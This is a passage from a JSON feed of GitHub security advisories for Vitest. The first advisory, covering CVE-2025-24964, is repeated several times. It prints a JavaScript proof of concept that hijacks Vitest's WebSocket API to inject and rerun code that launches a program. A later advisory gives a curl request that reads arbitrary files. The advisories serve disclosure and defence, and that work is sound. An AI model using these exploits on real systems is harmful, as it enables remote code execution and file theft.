e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});\n\n// actual code to run\nconst ws = new WebSocket('ws://localhost:51204/__vitest_api__')\nws.addEventListener('message', e =&gt; {\n    console.log(e.data)\n})\nws.addEventListener('open', () =&gt; {\n    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: \"getFiles\", a: [] }))\n\n    const testFilePath = \"/path/to/test-file/basic.test.ts\" // use a test file returned from the response of \"getFiles\"\n\n    // edit file content to inject command execution\n    ws.send(Flatted.stringify({\n      t: 'q',\n      i: crypto.randomUUID(),\n      m: \"saveTestFile\",\n      a: [testFilePath, \"import child_process from 'child_process';child_process.execSync('calc')\"]\n    }))\n    // rerun the tests to run the injected command execution code\n    ws.send(Flatted.stringify({\n      t: 'q',\n      i: crypto.randomUUID(),\n      m: \"rerun\",\n      a: [testFilePath]\n    }))\n})\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability can result in remote code execution for users that are using Vitest serve API.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq\">https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc\">https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241\">https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383\">https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24964\">https://nvd.nist.gov/vuln/detail/CVE-2025-24964</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></li>\n<li><a href=\"https://vitest.dev/config/#api\">https://vitest.dev/config/#api</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9crc-q9x8-hgqq\">https://github.com/advisories/GHSA-9crc-q9x8-hgqq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9crc-q9x8-hgqq",
            "title": "[vitest] Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening",
            "date_modified": "2025-02-04T22:04:11.000Z",
            "date_published": "2025-02-04T17:00:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9crc-q9x8-hgqq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.</p>\n<h3 id=\"details\">Details</h3>\n<p>When <a href=\"https://vitest.dev/config/#api\"><code>api</code> option</a> is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.\n<a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></p>\n<p>This WebSocket server has <code>saveTestFile</code> API that can edit a test file and <code>rerun</code> API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the <code>saveTestFile</code> API and then running that file by calling the <code>rerun</code> API.\n<a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Open Vitest UI.</li>\n<li>Access a malicious web site with the script below.</li>\n<li>If you have <code>calc</code> executable in <code>PATH</code> env var (you'll likely have it if you are running on Windows), that application will be executed.</li>\n</ol>\n<pre><code class=\"language-js\">// code from https://github.com/WebReflection/flatted\nconst Flatted=function(n){\"use strict\";function t(n){return t=\"function\"==typeof Symbol&amp;&amp;\"symbol\"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&amp;&amp;\"function\"==typeof Symbol&amp;&amp;n.constructor===Symbol&amp;&amp;n!==Symbol.prototype?\"symbol\":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f=\"string\",i={},c=\"object\",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p&lt;y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&amp;&amp;(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g&lt;m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&amp;&amp;u?y(o,new Set,u,f):u;return f.call({\"\":i},\"\",i)},S=function(n,r,o){for(var u=r&amp;&amp;t(r)===c?function(n,t){return\"\"===n||-1&lt;r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({\"\":n},\"\",n)),v=!y;y&lt;l.length;)v=!0,s[y]=e(l[y++],S,o);return\"[\"+s.join(\",\")+\"]\";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});\n\n// actual code to run\nconst ws = new WebSocket('ws://localhost:51204/__vitest_api__')\nws.addEventListener('message', e =&gt; {\n    console.log(e.data)\n})\nws.addEventListener('open', () =&gt; {\n    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: \"getFiles\", a: [] }))\n\n    const testFilePath = \"/path/to/test-file/basic.test.ts\" // use a test file returned from the response of \"getFiles\"\n\n    // edit file content to inject command execution\n    ws.send(Flatted.stringify({\n      t: 'q',\n      i: crypto.randomUUID(),\n      m: \"saveTestFile\",\n      a: [testFilePath, \"import child_process from 'child_process';child_process.execSync('calc')\"]\n    }))\n    // rerun the tests to run the injected command execution code\n    ws.send(Flatted.stringify({\n      t: 'q',\n      i: crypto.randomUUID(),\n      m: \"rerun\",\n      a: [testFilePath]\n    }))\n})\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability can result in remote code execution for users that are using Vitest serve API.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq\">https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc\">https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241\">https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383\">https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24964\">https://nvd.nist.gov/vuln/detail/CVE-2025-24964</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></li>\n<li><a href=\"https://vitest.dev/config/#api\">https://vitest.dev/config/#api</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9crc-q9x8-hgqq\">https://github.com/advisories/GHSA-9crc-q9x8-hgqq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9crc-q9x8-hgqq",
            "title": "[vitest] Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening",
            "date_modified": "2025-02-04T22:04:11.000Z",
            "date_published": "2025-02-04T17:00:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9crc-q9x8-hgqq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.</p>\n<h3 id=\"details\">Details</h3>\n<p>When <a href=\"https://vitest.dev/config/#api\"><code>api</code> option</a> is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.\n<a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></p>\n<p>This WebSocket server has <code>saveTestFile</code> API that can edit a test file and <code>rerun</code> API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the <code>saveTestFile</code> API and then running that file by calling the <code>rerun</code> API.\n<a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Open Vitest UI.</li>\n<li>Access a malicious web site with the script below.</li>\n<li>If you have <code>calc</code> executable in <code>PATH</code> env var (you'll likely have it if you are running on Windows), that application will be executed.</li>\n</ol>\n<pre><code class=\"language-js\">// code from https://github.com/WebReflection/flatted\nconst Flatted=function(n){\"use strict\";function t(n){return t=\"function\"==typeof Symbol&amp;&amp;\"symbol\"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&amp;&amp;\"function\"==typeof Symbol&amp;&amp;n.constructor===Symbol&amp;&amp;n!==Symbol.prototype?\"symbol\":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f=\"string\",i={},c=\"object\",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p&lt;y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&amp;&amp;(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g&lt;m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&amp;&amp;u?y(o,new Set,u,f):u;return f.call({\"\":i},\"\",i)},S=function(n,r,o){for(var u=r&amp;&amp;t(r)===c?function(n,t){return\"\"===n||-1&lt;r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({\"\":n},\"\",n)),v=!y;y&lt;l.length;)v=!0,s[y]=e(l[y++],S,o);return\"[\"+s.join(\",\")+\"]\";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});\n\n// actual code to run\nconst ws = new WebSocket('ws://localhost:51204/__vitest_api__')\nws.addEventListener('message', e =&gt; {\n    console.log(e.data)\n})\nws.addEventListener('open', () =&gt; {\n    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: \"getFiles\", a: [] }))\n\n    const testFilePath = \"/path/to/test-file/basic.test.ts\" // use a test file returned from the response of \"getFiles\"\n\n    // edit file content to inject command execution\n    ws.send(Flatted.stringify({\n      t: 'q',\n      i: crypto.randomUUID(),\n      m: \"saveTestFile\",\n      a: [testFilePath, \"import child_process from 'child_process';child_process.execSync('calc')\"]\n    }))\n    // rerun the tests to run the injected command execution code\n    ws.send(Flatted.stringify({\n      t: 'q',\n      i: crypto.randomUUID(),\n      m: \"rerun\",\n      a: [testFilePath]\n    }))\n})\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability can result in remote code execution for users that are using Vitest serve API.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq\">https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc\">https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241\">https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383\">https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24964\">https://nvd.nist.gov/vuln/detail/CVE-2025-24964</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></li>\n<li><a href=\"https://vitest.dev/config/#api\">https://vitest.dev/config/#api</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9crc-q9x8-hgqq\">https://github.com/advisories/GHSA-9crc-q9x8-hgqq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9crc-q9x8-hgqq",
            "title": "[vitest] Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening",
            "date_modified": "2025-02-04T22:04:11.000Z",
            "date_published": "2025-02-04T17:00:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9crc-q9x8-hgqq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Arbitrary remote Code Execution when accessing a malicious website while Vitest API server is listening by Cross-site WebSocket hijacking (CSWSH) attacks.</p>\n<h3 id=\"details\">Details</h3>\n<p>When <a href=\"https://vitest.dev/config/#api\"><code>api</code> option</a> is enabled (Vitest UI enables it), Vitest starts a WebSocket server. This WebSocket server did not check Origin header and did not have any authorization mechanism and was vulnerable to CSWSH attacks.\n<a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></p>\n<p>This WebSocket server has <code>saveTestFile</code> API that can edit a test file and <code>rerun</code> API that can rerun the tests. An attacker can execute arbitrary code by injecting a code in a test file by the <code>saveTestFile</code> API and then running that file by calling the <code>rerun</code> API.\n<a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Open Vitest UI.</li>\n<li>Access a malicious web site with the script below.</li>\n<li>If you have <code>calc</code> executable in <code>PATH</code> env var (you'll likely have it if you are running on Windows), that application will be executed.</li>\n</ol>\n<pre><code class=\"language-js\">// code from https://github.com/WebReflection/flatted\nconst Flatted=function(n){\"use strict\";function t(n){return t=\"function\"==typeof Symbol&amp;&amp;\"symbol\"==typeof Symbol.iterator?function(n){return typeof n}:function(n){return n&amp;&amp;\"function\"==typeof Symbol&amp;&amp;n.constructor===Symbol&amp;&amp;n!==Symbol.prototype?\"symbol\":typeof n},t(n)}var r=JSON.parse,e=JSON.stringify,o=Object.keys,u=String,f=\"string\",i={},c=\"object\",a=function(n,t){return t},l=function(n){return n instanceof u?u(n):n},s=function(n,r){return t(r)===f?new u(r):r},y=function n(r,e,f,a){for(var l=[],s=o(f),y=s.length,p=0;p&lt;y;p++){var v=s[p],S=f[v];if(S instanceof u){var b=r[S];t(b)!==c||e.has(b)?f[v]=a.call(f,v,b):(e.add(b),f[v]=i,l.push({k:v,a:[r,e,b,a]}))}else f[v]!==i&amp;&amp;(f[v]=a.call(f,v,S))}for(var m=l.length,g=0;g&lt;m;g++){var h=l[g],O=h.k,d=h.a;f[O]=a.call(f,O,n.apply(null,d))}return f},p=function(n,t,r){var e=u(t.push(r)-1);return n.set(r,e),e},v=function(n,e){var o=r(n,s).map(l),u=o[0],f=e||a,i=t(u)===c&amp;&amp;u?y(o,new Set,u,f):u;return f.call({\"\":i},\"\",i)},S=function(n,r,o){for(var u=r&amp;&amp;t(r)===c?function(n,t){return\"\"===n||-1&lt;r.indexOf(n)?t:void 0}:r||a,i=new Map,l=[],s=[],y=+p(i,l,u.call({\"\":n},\"\",n)),v=!y;y&lt;l.length;)v=!0,s[y]=e(l[y++],S,o);return\"[\"+s.join(\",\")+\"]\";function S(n,r){if(v)return v=!v,r;var e=u.call(this,n,r);switch(t(e)){case c:if(null===e)return e;case f:return i.get(e)||p(i,l,e)}return e}};return n.fromJSON=function(n){return v(e(n))},n.parse=v,n.stringify=S,n.toJSON=function(n){return r(S(n))},n}({});\n\n// actual code to run\nconst ws = new WebSocket('ws://localhost:51204/__vitest_api__')\nws.addEventListener('message', e =&gt; {\n    console.log(e.data)\n})\nws.addEventListener('open', () =&gt; {\n    ws.send(Flatted.stringify({ t: 'q', i: crypto.randomUUID(), m: \"getFiles\", a: [] }))\n\n    const testFilePath = \"/path/to/test-file/basic.test.ts\" // use a test file returned from the response of \"getFiles\"\n\n    // edit file content to inject command execution\n    ws.send(Flatted.stringify({\n      t: 'q',\n      i: crypto.randomUUID(),\n      m: \"saveTestFile\",\n      a: [testFilePath, \"import child_process from 'child_process';child_process.execSync('calc')\"]\n    }))\n    // rerun the tests to run the injected command execution code\n    ws.send(Flatted.stringify({\n      t: 'q',\n      i: crypto.randomUUID(),\n      m: \"rerun\",\n      a: [testFilePath]\n    }))\n})\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>This vulnerability can result in remote code execution for users that are using Vitest serve API.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq\">https://github.com/vitest-dev/vitest/security/advisories/GHSA-9crc-q9x8-hgqq</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc\">https://github.com/vitest-dev/vitest/commit/191ef9e34c867d0efd04f49b3d38193a68e825dc</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241\">https://github.com/vitest-dev/vitest/commit/7ce9fbb4972d45c6fd34c843645ef6f549bbb241</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383\">https://github.com/vitest-dev/vitest/commit/e0fe1d81e2d4bcddb1c6ca3c5c3970d8ba697383</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24964\">https://nvd.nist.gov/vuln/detail/CVE-2025-24964</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L32-L46</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76\">https://github.com/vitest-dev/vitest/blob/9a581e1c43e5c02b11e2a8026a55ce6a8cb35114/packages/vitest/src/api/setup.ts#L66-L76</a></li>\n<li><a href=\"https://vitest.dev/config/#api\">https://vitest.dev/config/#api</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-9crc-q9x8-hgqq\">https://github.com/advisories/GHSA-9crc-q9x8-hgqq</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-9crc-q9x8-hgqq",
            "title": "[vitest] Vitest allows Remote Code Execution when accessing a malicious website while Vitest API server is listening",
            "date_modified": "2025-02-04T22:04:11.000Z",
            "date_published": "2025-02-04T17:00:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-9crc-q9x8-hgqq"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p><code>__screenshot-error</code> handler on the browser mode HTTP server that responds any file on the file system. Especially if the server is exposed on the network by <a href=\"https://vitest.dev/guide/browser/config.html#browser-api\"><code>browser.api.host: true</code></a>, an attacker can send a request to that handler from remote to get the content of arbitrary files.</p>\n<h3 id=\"details\">Details</h3>\n<p>This <code>__screenshot-error</code> handler on the browser mode HTTP server responds any file on the file system.\n<a href=\"https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130\">https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130</a></p>\n<p>This code was added by <a href=\"https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f\">https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f</a>.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li>Create a directory and change the current directory to that directory</li>\n<li>Run <code>npx vitest init browser</code></li>\n<li>Run <code>npm run test:browser</code></li>\n<li>Run <code>curl http://localhost:63315/__screenshot-error?file=/path/to/any/file</code></li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>Users explicitly exposing the browser mode server to the network by <a href=\"https://vitest.dev/guide/browser/config.html#browser-api\"><code>browser.api.host: true</code></a> may get any files exposed.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5\">https://github.com/vitest-dev/vitest/security/advisories/GHSA-8gvc-j273-4wm5</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f\">https://github.com/vitest-dev/vitest/commit/2d62051f13b4b0939b2f7e94e88006d830dc4d1f</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/commit/ed9aeba212df04b83ed01810780663ff2cdd0adf\">https://github.com/vitest-dev/vitest/commit/ed9aeba212df04b83ed01810780663ff2cdd0adf</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2025-24963\">https://nvd.nist.gov/vuln/detail/CVE-2025-24963</a></li>\n<li><a href=\"https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130\">https://github.com/vitest-dev/vitest/blob/f17918a79969d27a415f70431e08a9445b051e45/packages/browser/src/node/plugin.ts#L88-L130</a></li>\n<li><a href=\"https://vitest.dev/guide/browser/config.html#browser-api\">https://vitest.dev/guide/browser/config.html#browser-api</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-8gvc-j273-4wm5\">https://github.com/advisories/GHSA-8gvc-j273-4wm5</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-8gvc-j273-4wm5",
            "title": "[@vitest/browser] Vitest browser mode serves arbitrary files",
            "date_modified": "2025-02-04T22:03:49.000Z",
            "date_published": "2025-02-04T16:51:08.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-8gvc-j273-4wm5"
            },
            "tags": [
                "severity"
            ]
        }
    ]
}